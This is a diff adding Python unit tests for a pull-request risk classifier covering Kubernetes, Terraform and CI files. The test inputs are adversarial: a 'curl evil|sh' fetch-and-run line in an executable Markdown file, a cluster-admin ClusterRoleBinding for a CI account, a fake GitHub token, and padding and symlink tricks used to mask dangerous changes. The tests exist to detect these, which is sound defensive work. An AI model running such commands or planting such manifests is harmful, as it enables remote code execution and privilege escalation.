@@ -1503,5 +1503,423 @@ class AdversarialRegressionSuiteTests(unittest.TestCase):
             self.assertIn("CRITICAL_GOVERNANCE_OR_CI_FILE", {x.code for x in res_flood.reasons})
 
 
+class TriageEngineHardeningTests(unittest.TestCase):
+    """Exhaustive adversarial tests for PR triage, anti-masking, renames, duplicates, and capacity caps."""
+
+    CRB_ADMIN = (
+        "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\n"
+        "metadata:\n  name: sneak-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n"
+        "  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n  - kind: ServiceAccount\n"
+        "    name: ci\n    namespace: default\n"
+    )
+
+    def test_license_prefix_smuggling_and_doc_secret_leaks_and_exec_docs(self) -> None:
+        # `license*` prefix on YAML/Terraform/script MUST NOT match DOCUMENTATION_ONLY
+        r_rbac = classify_changes([_add("manifests/license-rbac.yaml", self.CRB_ADMIN)])
+        self.assertEqual(r_rbac.risk_level, RISK_CRITICAL)
+        self.assertIn("CRITICAL_PRIVILEGED_RBAC", {x.code for x in r_rbac.reasons})
+
+        r_tf = classify_changes([_del("infra/license.tf", 'resource "google_storage_bucket" "b" {}\n')])
+        self.assertEqual(r_tf.risk_level, RISK_HIGH)
+        self.assertEqual(r_tf.disruptiveness, DISRUPT_DESTRUCTIVE)
+
+        r_sh = classify_changes([_add("scripts/license-check.sh", "#!/bin/sh\nid\n", after_mode="100755")])
+        self.assertEqual(r_sh.risk_level, RISK_HIGH)
+        self.assertFalse(r_sh.supported)
+        self.assertIn("EXECUTABLE_FILE", {x.code for x in r_sh.reasons})
+
+        # Executable `.md` (`100755`) MUST NOT be classified as harmless documentation
+        r_exec_doc = classify_changes([_add("docs/setup.md", "#!/bin/sh\ncurl evil|sh\n", after_mode="100755")])
+        self.assertEqual(r_exec_doc.risk_level, RISK_HIGH)
+        self.assertFalse(r_exec_doc.supported)
+        self.assertIn("EXECUTABLE_FILE", {x.code for x in r_exec_doc.reasons})
+
+        # Plaintext credential leaked inside README.md -> CRITICAL + irreversible
+        fake_pat = "ghp_" + "1234567890abcdefghij1234567890abcd"
+        r_leak_doc = classify_changes([_add("docs/README.md", f"# Token\nUse {fake_pat}\n")])
+        self.assertEqual(r_leak_doc.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_leak_doc.revertability, REVERT_IRREVERSIBLE)
+        self.assertTrue(r_leak_doc.effective_changes)
+        self.assertIn("PLAINTEXT_SECRET_LEAK", {x.code for x in r_leak_doc.reasons})
+
+        # Genuine LICENSE / NOTICE files outside sync roots stay LOW non-effective
+        for doc_name in ("LICENSE", "LICENSE.txt", "LICENSE.md", "NOTICE"):
+            with self.subTest(doc=doc_name):
+                r_ok = classify_changes([_add(doc_name, "Apache License 2.0\n")])
+                self.assertEqual(r_ok.risk_level, RISK_LOW)
+                self.assertFalse(r_ok.effective_changes)
+                self.assertTrue(r_ok.supported)
+
+    def test_sync_roots_expanded_and_ci_git_hooks_terraform_supply_chain_paths(self) -> None:
+        # Markdown inside Flux/Argo sync roots could feed Kustomize configMapGenerator -> UNKNOWN
+        for sync_doc in (
+            "apps/shop/README.md",
+            "manifests/web/notes.md",
+            "infrastructure/cert-manager/README.md",
+            "tenants/team-a/README.md",
+            "environments/dev/README.md",
+            "deploy/api/README.md",
+            "k8s/api/README.md",
+        ):
+            with self.subTest(sync_doc=sync_doc):
+                r = classify_changes([_add(sync_doc, "# generator input\n")])
+                self.assertEqual(r.risk_level, RISK_UNKNOWN)
+                self.assertFalse(r.supported)
+                self.assertTrue(r.effective_changes)
+
+        # Expanded CI, git-hook, CODEOWNERS, and agent instruction paths -> CRITICAL
+        for crit_path in (
+            ".gitlab/agents/prod/config.yaml",
+            ".gitea/workflows/deploy.yml",
+            ".woodpecker/build.yml",
+            "azure-pipelines.yml",
+            "bitbucket-pipelines.yml",
+            ".husky/pre-commit",
+            ".githooks/pre-push",
+            ".pre-commit-config.yaml",
+            ".cursor/rules/sec.mdc",
+            ".gemini/styleguide.md",
+            ".codex/instructions.md",
+            ".agents/policy.md",
+            "docs/CODEOWNERS",
+            ".github/CODEOWNERS",
+        ):
+            with self.subTest(crit_path=crit_path):
+                r = classify_changes([_add(crit_path, "x: 1\n")])
+                self.assertEqual(r.risk_level, RISK_CRITICAL)
+                self.assertEqual(r.blast_radius, BLAST_CRITICAL)
+
+        # OpenTofu, Terragrunt, and JSON Terraform files (`.tofu`, `.terragrunt.hcl`, `.tf.json`, `.tofu.json`)
+        for tf_path in ("infra/main.tofu", "infra/terragrunt.hcl", "infra/main.tf.json", "infra/main.tofu.json"):
+            with self.subTest(tf_path=tf_path):
+                r_add = classify_changes([_add(tf_path, "{}\n")])
+                self.assertEqual(r_add.risk_level, RISK_UNKNOWN)
+                self.assertIn("UNSUPPORTED_TERRAFORM_FILE", {x.code for x in r_add.reasons})
+
+                r_del = classify_changes([_del(tf_path, "{}\n")])
+                self.assertEqual(r_del.risk_level, RISK_HIGH)
+                self.assertEqual(r_del.disruptiveness, DISRUPT_DESTRUCTIVE)
+
+        # Deleting Terraform in a prod path escalates HIGH -> CRITICAL
+        r_prod_tf = classify_changes([_del("infra/prod/main.tf.json", "{}\n")])
+        self.assertEqual(r_prod_tf.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_prod_tf.disruptiveness, DISRUPT_DESTRUCTIVE)
+
+        # Expanded supply-chain build files -> HIGH
+        for sc_path in ("skaffold.yaml", "docker-compose.yaml", "uv.lock", "Tiltfile", "api.Containerfile", "pom.xml"):
+            with self.subTest(sc_path=sc_path):
+                r_sc = classify_changes([_add(sc_path, "# build\n")])
+                self.assertEqual(r_sc.risk_level, RISK_HIGH)
+                self.assertIn("SUPPLY_CHAIN_BUILD_FILE", {x.code for x in r_sc.reasons})
+
+    def test_max_total_bytes_anti_masking_and_smallest_first_parse_budget(self) -> None:
+        pad_cm = BASE_CONFIGMAP + '  BLOB: "' + ("x" * (480 * 1024)) + '"\n'
+        pads = [_add(f"clusters/dev/00_pad_{i}.yaml", pad_cm.replace("web-config", f"pad-{i}")) for i in range(10)]
+
+        # 1. Over-budget padding alone -> UNKNOWN + PR_PAYLOAD_TOO_LARGE
+        r_over = classify_changes(pads)
+        self.assertEqual(r_over.risk_level, RISK_UNKNOWN)
+        self.assertFalse(r_over.supported)
+        self.assertIn("PR_PAYLOAD_TOO_LARGE", {x.code for x in r_over.reasons})
+
+        # 2. Over-budget padding + governance workflow -> CRITICAL (never masked to UNKNOWN!)
+        r_gov = classify_changes([*pads, _add(".github/workflows/pwn.yml", "on: push\n")])
+        self.assertEqual(r_gov.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_gov.supported)
+        self.assertIn("CRITICAL_GOVERNANCE_OR_CI_FILE", {x.code for x in r_gov.reasons})
+
+        # 3. Over-budget padding named `00_pad_*` BEFORE small `zz_crb.yaml` -> smallest-first budget catches CRITICAL!
+        r_crb = classify_changes([*pads, _add("clusters/dev/zz_crb.yaml", self.CRB_ADMIN)])
+        self.assertEqual(r_crb.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_crb.supported)
+        codes = {x.code for x in r_crb.reasons}
+        self.assertIn("CRITICAL_PRIVILEGED_RBAC", codes)
+        self.assertIn("PR_PAYLOAD_TOO_LARGE", codes)
+
+    def test_duplicate_resource_anti_masking_intra_file_and_cross_file(self) -> None:
+        # Intra-file duplicate ConfigMaps CANNOT mask a ClusterRoleBinding in Doc 3!
+        dup_plus_crb = f"{BASE_CONFIGMAP}---\n{BASE_CONFIGMAP}---\n{self.CRB_ADMIN}"
+        r_intra = classify_changes([_add("clusters/dev/bundle.yaml", dup_plus_crb)])
+        self.assertEqual(r_intra.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_intra.supported)
+        codes = {x.code for x in r_intra.reasons}
+        self.assertIn("DUPLICATE_RESOURCE_IDENTITY", codes)
+        self.assertIn("CRITICAL_PRIVILEGED_RBAC", codes)
+
+        # Cluster-scoped duplicate ignoring bogus metadata.namespace is caught and doesn't pollute namespaces_touched
+        cr1 = "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: reader\nrules: []\n"
+        cr2 = "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: reader\n  namespace: shop\nrules: []\n"
+        r_cr_dup = classify_changes([_add("clusters/dev/roles.yaml", f"{cr1}---\n{cr2}")])
+        self.assertFalse(r_cr_dup.supported)
+        self.assertIn("DUPLICATE_RESOURCE_IDENTITY", {x.code for x in r_cr_dup.reasons})
+        self.assertEqual(r_cr_dup.stats.namespaces_touched, 0)
+
+        # Cross-file duplicate GVKNN in the same cluster / sync scope fails closed to UNKNOWN
+        c_a = _add("clusters/dev/cm-a.yaml", BASE_CONFIGMAP)
+        c_b = _add("clusters/dev/cm-b.yaml", BASE_CONFIGMAP + '  EXTRA: "1"\n')
+        r_cross = classify_changes([c_a, c_b])
+        self.assertEqual(r_cross.risk_level, RISK_UNKNOWN)
+        self.assertFalse(r_cross.supported)
+        self.assertIn("DUPLICATE_RESOURCE_IDENTITY", {x.code for x in r_cross.reasons})
+
+        # Cross-file duplicate paired with a CRITICAL resource still surfaces CRITICAL
+        r_cross_crit = classify_changes([c_a, _add("clusters/dev/cm-b.yaml", f"{BASE_CONFIGMAP}---\n{self.CRB_ADMIN}")])
+        self.assertEqual(r_cross_crit.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_cross_crit.supported)
+
+        # Moving a resource from one YAML file to another in the same dir evaluates as DELETE + ADD (not duplicate)
+        multi_before = f"{BASE_SERVICE}---\n{BASE_DEPLOY}"
+        r_move = classify_changes(
+            [
+                _mod("clusters/dev/all.yaml", multi_before, BASE_SERVICE),
+                _add("clusters/dev/web-deploy.yaml", BASE_DEPLOY),
+            ]
+        )
+        self.assertEqual(r_move.risk_level, RISK_HIGH)
+        self.assertIn(r_move.disruptiveness, (DISRUPT_DISRUPTIVE, DISRUPT_DESTRUCTIVE))
+        self.assertNotIn("DUPLICATE_RESOURCE_IDENTITY", {x.code for x in r_move.reasons})
+
+    def test_overlay_unrendered_anti_masking_and_symlink_typechanges(self) -> None:
+        # Privileged RBAC inside overlays/ MUST escalate above UNKNOWN to CRITICAL
+        r_ov_crb = classify_changes([_add("clusters/prod/overlays/rbac.yaml", self.CRB_ADMIN)])
+        self.assertEqual(r_ov_crb.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_ov_crb.supported)
+        ov_codes = {x.code for x in r_ov_crb.reasons}
+        self.assertIn("UNRENDERED_PACKAGE_OR_OVERLAY", ov_codes)
+        self.assertIn("CRITICAL_PRIVILEGED_RBAC", ov_codes)
+
+        # Kustomize `$patch: delete` on a PVC inside `patches/` -> CRITICAL + destructive + irreversible
+        del_patch = (
+            "apiVersion: v1\nkind: PersistentVolumeClaim\n"
+            "metadata:\n  name: pg-data\n  namespace: db\n$patch: delete\n"
+        )
+        r_patch = classify_changes([_add("clusters/dev/patches/del-pvc.yaml", del_patch)])
+        self.assertEqual(r_patch.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_patch.disruptiveness, DISRUPT_DESTRUCTIVE)
+        self.assertEqual(r_patch.revertability, REVERT_IRREVERSIBLE)
+        self.assertFalse(r_patch.supported)
+
+        # Plaintext credential leaked in Helm values.yaml -> CRITICAL + irreversible
+        fake_pat = "ghp_" + "1234567890abcdefghij1234567890abcd"
+        r_val = classify_changes([_add("charts/web/values.yaml", f"apiToken: {fake_pat}\n")])
+        self.assertEqual(r_val.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_val.revertability, REVERT_IRREVERSIBLE)
+        self.assertFalse(r_val.supported)
+
+        # Symlink -> regular manifest (`120000 -> 100644`) adding cluster-admin -> CRITICAL
+        r_sym_to_reg = classify_changes(
+            [
+                FileChange(
+                    path="clusters/dev/rbac.yaml",
+                    change_type=CHANGE_MODIFIED,
+                    before=None,
+                    after=self.CRB_ADMIN.encode("utf-8"),
+                    before_mode="120000",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_sym_to_reg.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_sym_to_reg.supported)
+        self.assertIn("SYMLINK_CHANGE", {x.code for x in r_sym_to_reg.reasons})
+        self.assertIn("CRITICAL_PRIVILEGED_RBAC", {x.code for x in r_sym_to_reg.reasons})
+
+        # Regular Namespace manifest -> symlink (`100644 -> 120000`) -> CRITICAL destructive Namespace delete
+        ns = "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: payments\n"
+        r_reg_to_sym = classify_changes(
+            [
+                FileChange(
+                    path="clusters/prod/ns.yaml",
+                    change_type=CHANGE_MODIFIED,
+                    before=ns.encode("utf-8"),
+                    after=None,
+                    before_mode="100644",
+                    after_mode="120000",
+                )
+            ]
+        )
+        self.assertEqual(r_reg_to_sym.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_reg_to_sym.disruptiveness, DISRUPT_DESTRUCTIVE)
+        self.assertEqual(r_reg_to_sym.revertability, REVERT_IRREVERSIBLE)
+        self.assertFalse(r_reg_to_sym.supported)
+
+    def test_cross_directory_renames_invalid_paths_same_dir_rename_and_modes(self) -> None:
+        # Cross-directory rename within the same cluster (`synced/` -> `unsynced/`) splits into delete + add
+        r_sub_move = classify_changes(
+            [
+                FileChange(
+                    path="clusters/dev/unsynced/pvc.yaml",
+                    old_path="clusters/dev/synced/pvc.yaml",
+                    change_type=CHANGE_RENAMED,
+                    before=BASE_PVC.encode("utf-8"),
+                    after=BASE_PVC.encode("utf-8"),
+                    before_mode="100644",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_sub_move.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_sub_move.disruptiveness, DISRUPT_DESTRUCTIVE)
+        self.assertEqual(r_sub_move.revertability, REVERT_IRREVERSIBLE)
+
+        # Rename from `apps/` sync root to `archive/` splits into delete + add
+        r_apps_move = classify_changes(
+            [
+                FileChange(
+                    path="archive/pvc.yaml",
+                    old_path="apps/payments/pvc.yaml",
+                    change_type=CHANGE_RENAMED,
+                    before=BASE_PVC.encode("utf-8"),
+                    after=BASE_PVC.encode("utf-8"),
+                    before_mode="100644",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_apps_move.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_apps_move.disruptiveness, DISRUPT_DESTRUCTIVE)
+
+        # Renaming a prod Namespace to an invalid backslash path STILL evaluates CRITICAL Namespace delete!
+        ns = "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: payments\n"
+        r_bad_ren = classify_changes(
+            [
+                FileChange(
+                    path="docs/bad\\path.md",
+                    old_path="clusters/prod/payments-ns.yaml",
+                    change_type=CHANGE_RENAMED,
+                    before=ns.encode("utf-8"),
+                    after=ns.encode("utf-8"),
+                    before_mode="100644",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_bad_ren.risk_level, RISK_CRITICAL)
+        self.assertEqual(r_bad_ren.disruptiveness, DISRUPT_DESTRUCTIVE)
+        self.assertEqual(r_bad_ren.revertability, REVERT_IRREVERSIBLE)
+        self.assertFalse(r_bad_ren.supported)
+
+        # Invalid backslash/Trojan-Source governance path stays CRITICAL (never downgraded to HIGH)
+        r_bad_gov = classify_changes([_add(".github/workflows/pwn\\evil.yml", "on: push\n")])
+        self.assertEqual(r_bad_gov.risk_level, RISK_CRITICAL)
+        self.assertFalse(r_bad_gov.supported)
+
+        r_bidi_path = classify_changes([_add("docs/note\u202eyaml.md", "# text\n")])
+        self.assertEqual(r_bidi_path.risk_level, RISK_HIGH)
+        self.assertFalse(r_bidi_path.supported)
+
+        # Same-directory rename in prod and kube-system escalates and tracks namespaces_touched
+        r_prod_ren = classify_changes(
+            [
+                FileChange(
+                    path="clusters/prod/web2.yaml",
+                    old_path="clusters/prod/web.yaml",
+                    change_type=CHANGE_RENAMED,
+                    before=BASE_DEPLOY.encode("utf-8"),
+                    after=BASE_DEPLOY.encode("utf-8"),
+                    before_mode="100644",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_prod_ren.risk_level, RISK_HIGH)
+        self.assertEqual(r_prod_ren.stats.namespaces_touched, 1)
+
+        ks_dep = BASE_DEPLOY.replace("namespace: shop", "namespace: kube-system")
+        r_ks_ren = classify_changes(
+            [
+                FileChange(
+                    path="clusters/prod/coredns2.yaml",
+                    old_path="clusters/prod/coredns.yaml",
+                    change_type=CHANGE_RENAMED,
+                    before=ks_dep.encode("utf-8"),
+                    after=ks_dep.encode("utf-8"),
+                    before_mode="100644",
+                    after_mode="100644",
+                )
+            ]
+        )
+        self.assertEqual(r_ks_ren.risk_level, RISK_CRITICAL)
+
+        # Executable mode removal (`100755 -> 100644`) emits FILE_MODE_CHANGED (not COMMENT_OR_WHITESPACE_ONLY)
+        r_chmod = classify_changes(
+            [_mod("clusters/dev/web.yaml", BASE_DEPLOY, BASE_DEPLOY, before_mode="100755", after_mode="100644")]
+        )
+        self.assertEqual(r_chmod.risk_level, RISK_LOW)
+        self.assertIn("FILE_MODE_CHANGED", {x.code for x in r_chmod.reasons})
+        self.assertNotIn("COMMENT_OR_WHITESPACE_ONLY", {x.code for x in r_chmod.reasons})
+
+        # Empty YAML or `[]` / `null` JSON files fail closed to UNKNOWN (not LOW!)
+        for empty_path, body in (("clusters/dev/empty.yaml", ""), ("clusters/dev/arr.json", "[]"), ("clusters/dev/null.json", "null")):
+            with self.subTest(empty_path=empty_path):
+                r_emp = classify_changes([_add(empty_path, body)])
+                self.assertEqual(r_emp.risk_level, RISK_UNKNOWN)
+                self.assertFalse(r_emp.supported)
+
+    def test_generate_name_api_version_monotonic_ns_commutativity_and_compound_capacity(self) -> None:
+        # `metadata.generateName` without `metadata.name` fails closed
+        gen_cm = "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  generateName: web-cfg-\n  namespace: shop\ndata:\n  A: '1'\n"
+        r_gen_add = classify_changes([_add("clusters/dev/gen.yaml", gen_cm)])
+        self.assertEqual(r_gen_add.risk_level, RISK_UNKNOWN)
+        self.assertFalse(r_gen_add.supported)
+
+        # Swapping `metadata.name: web` -> `metadata.generateName: web` NEVER passes as LOW/MEDIUM!
+        gen_swap = BASE_DEPLOY.replace("  name: web\n", "  generateName: web\n").replace("replicas: 4", "replicas: 5")
+        r_gen_mod = classify_changes([_mod("clusters/dev/web.yaml", BASE_DEPLOY, gen_swap)])
+        self.assertIn(r_gen_mod.risk_level, (RISK_HIGH, RISK_CRITICAL))
+        self.assertFalse(r_gen_mod.supported)
+
+        # Changing core `apiVersion: v1` -> bogus `v999` on ConfigMap fails closed to HIGH disruptive
+        r_apiver = classify_changes(
+            [_mod("clusters/dev/cm.yaml", BASE_CONFIGMAP, BASE_CONFIGMAP.replace("apiVersion: v1", "apiVersion: v999") + '  K: "v"\n')]
+        )
+        self.assertIn(r_apiver.risk_level, (RISK_HIGH, RISK_CRITICAL))
+        self.assertNotEqual(r_apiver.revertability, REVERT_EASY)
+
+        # Commutative monotonic Namespace label merge across multiple files in either order
+        ns_prod = "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: shop\n  labels:\n    env: prod\n"
+        ns_dev = "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: shop\n  labels:\n    env: dev\n"
+        bump = BASE_DEPLOY.replace("replicas: 4", "replicas: 5")
+        r_order1 = classify_changes(
+            [
+                _add("clusters/main/a-ns.yaml", ns_prod),
+                _del("clusters/main/z-ns.yaml", ns_dev),
+                _mod("clusters/main/m-web.yaml", BASE_DEPLOY, bump),
+            ]
+        )
+        dep1 = [rv for rv in r_order1.resources if rv.ref.kind == "Deployment"][0]
+        self.assertEqual(dep1.risk_level, RISK_MEDIUM)
+
+        # Sequential initContainers take `max` (not sum): 4 sequential 500m initContainers <= 800m app -> +0m init delta
+        seq_init_before = BASE_DEPLOY.replace('cpu: "100m"', 'cpu: "800m"').replace('cpu: "500m"', 'cpu: "1000m"') + (
+            "      initContainers:\n"
+            + "".join(
+                f"        - name: init-{i}\n          image: gcr.io/acme/init:v1.0.0\n"
+                "          resources:\n            requests:\n              cpu: \"200m\"\n              memory: \"64Mi\"\n"
+                for i in range(4)
+            )
+        )
+        seq_init_after = seq_init_before.replace('cpu: "200m"', 'cpu: "700m"')
+        r_seq = classify_changes([_mod("clusters/dev/web.yaml", seq_init_before, seq_init_after)])
+        self.assertEqual(r_seq.risk_level, RISK_LOW)
+        self.assertNotIn("COMPOUND_CAPACITY_INCREASE", {x.code for x in r_seq.reasons})
+
+        # Guaranteed QoS (`limits` without `requests`) defaults requests from limits, and >64 CPU hits HIGH cap!
+        guar = (
+            "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: big\n  namespace: shop\n"
+            "spec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: big\n"
+            "  template:\n    metadata:\n      labels:\n        app: big\n"
+            "    spec:\n      containers:\n        - name: app\n          image: gcr.io/acme/big:v1.0.0\n"
+            "          resources:\n            limits:\n              cpu: \"2000m\"\n              memory: \"4Gi\"\n"
+        )
+        # 4 added Deployments * (10 replicas * 2000m) = +80,000m (+80 CPU > 64 CPU HIGH cap)
+        r_high_cap = classify_changes(
+            [_add(f"clusters/dev/big-{i}.yaml", guar.replace("name: big", f"name: big-{i}")) for i in range(4)]
+        )
+        self.assertEqual(r_high_cap.risk_level, RISK_HIGH)
+        self.assertEqual(r_high_cap.blast_radius, BLAST_HIGH)
+        self.assertIn("COMPOUND_CAPACITY_HIGH_CAP", {x.code for x in r_high_cap.reasons})
+
+
 if __name__ == "__main__":
     unittest.main()
